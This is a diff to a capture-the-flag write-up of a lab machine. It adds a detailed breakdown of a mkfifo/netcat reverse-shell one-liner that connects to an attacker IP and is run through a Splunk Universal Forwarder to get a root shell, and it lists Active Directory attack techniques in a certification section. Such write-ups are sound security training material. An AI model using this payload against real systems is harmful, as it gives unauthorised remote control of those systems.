@@ -420,7 +420,8 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 ---
 
-Now you’ve got a **fully interactive shell**, and you won’t be left wondering why your commands aren’t doing anything.
+### Now you’ve got a **fully interactive shell**, and you won’t be left wondering why your commands aren’t doing anything.
+
 ---
 
 ## Checking Logs for Credentials
@@ -529,11 +530,145 @@ Now run:
 - `--lhost 10.10.14.38` is our attacking IP.
 - `--payload` is a quick trick using mkfifo to spawn a shell that connects back to us.
 
-We run it, and see:
+---
+
+### **Understanding the Payload (Optional)**
+
+_Feel free to skip this part, but if you're curious about how the payload works and why it gives us remote code execution (RCE), here's a breakdown._
+
+---
+
+### **TL;DR: How This Payload Gets Us RCE**
+
+This payload creates a **reverse shell** using a **named pipe (FIFO)** to keep the connection stable.
+
+1. **Creates a named pipe** (`mkfifo`) to act as a queue for input/output.
+2. **Spawns an interactive shell** (`/bin/sh -i`) to execute commands.
+3. **Uses netcat (`nc`) to send the shell’s output** to our attack machine (`10.10.14.38:1994`).
+4. **Keeps the connection alive** by continuously reading/writing from the pipe.
+
+---
+
+### **How Does This Relate to the `|` Pipe in Linux?**
+
+In Linux, we commonly use the **pipe (`|`) operator** to send the output of one command **into** another.
+
+#### **Example: Using a Simple Pipe**
+
+```bash
+echo "hello" | cat
+```
+
+- **`echo "hello"`** outputs the text `"hello"`.
+- **`|` (pipe operator)** takes that output and sends it as input to `cat`.
+- **`cat` reads it and prints `"hello"` back**.
+
+This is the **exact same concept** as what our named pipe does—**except our named pipe is persistent** instead of temporary.
+
+#### **What’s the Problem With a Normal Pipe?**
+
+A regular `|` works **once** and then **closes**:
+
+```bash
+echo "whoami" | /bin/sh
+```
+
+- Runs `whoami`, prints the output, **then exits**.
+- No way to keep interacting with the shell.
+
+To **fix this**, we create a **named pipe (FIFO)** that stays open, allowing continuous interaction—just like a **remote terminal**.
+
+---
+
+### **Breaking Down the Payload**
+
+```bash
+rm /tmp/0xjcbk_pipe; mkfifo /tmp/0xjcbk_pipe; cat /tmp/0xjcbk_pipe | /bin/sh -i 2>&1 | nc 10.10.14.38 1994 > /tmp/0xjcbk_pipe
+```
+
+This is a **reverse shell** payload that exploits Splunk Universal Forwarder’s ability to execute commands, allowing us to gain interactive access to the target machine.
+
+#### **1. Remove any existing named pipe (FIFO) to avoid conflicts**
+
+```bash
+rm /tmp/0xjcbk_pipe
+```
+
+- **Why?** `mkfifo` fails if a file with the same name already exists.
+- This ensures a clean setup before we create a new pipe.
+
+#### **2. Create a new named pipe (`mkfifo`)**
+
+```bash
+mkfifo /tmp/0xjcbk_pipe
+```
+
+- A **named pipe (FIFO)** is like a file that acts as a **queue**—one process writes, another reads.
+- This lets us send commands **without needing an actual terminal session**.
+
+#### **3. Set up a loop to read from the pipe and execute commands**
+
+```bash
+cat /tmp/0xjcbk_pipe | /bin/sh -i
+```
+
+- **`cat /tmp/0xjcbk_pipe`** → Reads **whatever is written** into the pipe.
+- **`| /bin/sh -i`** → Feeds that input to an **interactive shell** (`sh -i`).
+- **Why does this matter?**
+    - Normally, the shell expects input from a keyboard.
+    - Here, we trick it into **reading from the named pipe instead**.
+
+#### **4. Send shell output back to our attack machine using netcat**
+
+```bash
+| nc 10.10.14.38 1994
+```
+
+- **Sends the shell’s output** to our machine (`10.10.14.38`) on port `1994`.
+- We can now **see the results of our commands** on our listener (`nc -lvp 1994`).
+
+#### **5. Keep the connection alive by looping input/output**
+
+```bash
+> /tmp/0xjcbk_pipe
+```
+
+- This **redirects** anything coming from netcat **back into the pipe**.
+- **Why?**
+    - It lets us **type commands in netcat**, which are then **written into the pipe**.
+    - The shell reads from the pipe **continuously**, keeping the session open.
+
+---
+
+### **Why Does This Work?**
+
+- **The pipe (FIFO) stays open**, allowing continuous input/output.
+- **The shell (`sh -i`) executes commands** we send via the pipe.
+- **Netcat (`nc`) forwards output back to us** while also accepting new commands.
+
+Without the named pipe, the shell might close after **one command** instead of staying interactive. With this setup, we can **execute multiple commands remotely** without interruption.
+
+---
+
+### **Final Summary**
+
+This payload **manually recreates a pipe (`|`)** to keep the connection open:
+
+- **Commands from netcat → written into the pipe → executed by `/bin/sh`**.
+- **Shell output → sent back via netcat → we see it on our listener**.
+- **Keeps looping**, so we can interact with the shell **as if we were logged in locally**.
+
+ **Think of it like a hacked command terminal** we can now **send commands remotely, get responses, and maintain full control**. 
+
+---
+
+## Let's run our payload:
 
 ![[pysplunkRCE.png]]
 
-It connects back. Now, check the shell on your netcat listener:
+It connects, and no authentication issues, so now lets check the shell on your netcat listener and see what we get
+
+And oh my, what a thing of beauty, we get a shell, and most importantly, we have root.
 
 ![[root.png]]
 
@@ -557,14 +692,21 @@ This aligns with common OWASP Top 10 issues (Injection, Security Misconfiguratio
 
 ---
 
-**Done**. We have both the user and root flags. Remember to keep practicing the methodology: always try multiple angles (XSS, SSTI, SQLi), check logs, watch for reused or leaked credentials, and look for services like Splunk that might be misconfigured. Happy hacking.
+**Done**. We have both the user and root flags. Remember to keep practicing the methodology: always try multiple angles (XSS, SSTI, SQLi), check logs, watch for reused or leaked credentials, and look for services like Splunk that might be misconfigured. 
+
 ---
 
 ### **Shout-Out to TCM Security (PJPT, PWPA, PWPP)**
 
-Throughout this box, the methods and mindsets come straight from these courses. **PJPT** (Practical Junior Pentester) taught me the fundamentals of scanning and pivoting. **PWPA** (Practical Web Pentesting Analyst) honed my approach on OWASP vulnerabilities. **PWPP** (Practical Web Payload Pentesting) pushed me to develop advanced exploit payloads—like the ones we used in Jinja2 injection.
+Throughout this box, the techniques and mindset I applied come directly from TCM Security’s courses: **Practical Ethical Hacking (PEH)**, **Practical Bug Bounty (PBB)**, and **Practical Web Hacking (PWH)**. I currently hold the following TCM certifications:
 
-**Employers**: This synergy of hands-on labs plus methodical training is exactly what I bring to a real-world security team.
+- **PJPT (Practical Junior Penetration Tester)** – Focused on **network penetration testing**, covering **Active Directory attacks** like **LLMNR poisoning, Pass-the-Hash (PTH), MITM6, BloodHound enumeration, secrets dumping (LSASS, NTDS.dit, LDAP queries), PlumHound analysis, and Golden Ticket attacks**. I also leveraged **hash cracking with Hashcat** and explored **pivoting techniques** to escalate privileges and move laterally.
+    
+- **PWPA (Practical Web Pentesting Analyst)** – Strengthened my approach to **OWASP vulnerabilities**, exposing me to **SQL Injection, Cross-Site Scripting (XSS), Server-Side Template Injection (SSTI), file upload vulnerabilities, CSRF, directory traversal, local file inclusion (LFI), and web application misconfigurations**.
+    
+- **PWPP (Practical Web Payload Pentesting)** – Advanced my **web exploitation skills**, particularly in **API hacking, mass assignment vulnerabilities, authentication and authorization flaws, SQL/NoSQL injection, token-based attacks (JWT, OAuth), WebSocket security issues, and various manual XSS/SQLi techniques**.
+
+These certifications and experiences shaped my **approach to enumeration, exploitation, and privilege escalation**, allowing me to adapt and apply real-world techniques in this environment
 
 ---
 
@@ -574,6 +716,4 @@ Throughout this box, the methods and mindsets come straight from these courses. 
 - **SSTI** gave initial access; pivoting on **logged credentials** (a real-life, messy scenario) got us user.
 - Finally, misconfiguration in **Splunk** handed us **root**.
 
-This path showcases not only technical prowess but also a deeper understanding of **web app security** best practices, from **XSS filtering** to **Template Injection** to **Session/Logging misconfigurations**. If you read this as a potential employer or a budding pentester, hope you found it valuable—and a glimpse into my **TCM Security**-inspired methodology.
-
-**We are done here**. Two flags secured, knowledge gained, and a whole lot of fun in the process. See you on the next box.
+This path showcases deeper understanding of **web app security** best practices, from **XSS filtering** to **Template Injection** to **Session/Logging misconfigurations**. If you read this as a potential employer or a budding pentester, hope you found it valuable, and a glimpse into my **TCM Security**-inspired methodology.
